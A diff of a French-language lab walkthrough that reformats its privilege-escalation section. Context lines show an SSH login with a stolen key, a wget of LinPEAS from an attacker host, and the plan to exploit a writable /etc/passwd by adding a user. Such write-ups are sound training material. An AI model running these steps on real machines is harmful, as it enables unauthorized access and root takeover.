@@ -35,7 +35,9 @@ Connexion au serveur avec la passphrase fraîchement obtenue :
     ssh  -l mowree -i  id_rsa 192.168.161.212
     cat local.txt
 
-Élévation de privilèges classique, LinPEAS a trouvé que le fichier /etc/passwd était accessible en écriture et je peux donc me rajouter comme utilisateur :
+### Élévation de privilèges : 
+
+LinPEAS a trouvé que le fichier /etc/passwd était accessible en écriture et je peux donc me rajouter comme utilisateur :
 
     wget http://192.168.45.199/linpeas.sh
     chmod u+x linpeas.sh  
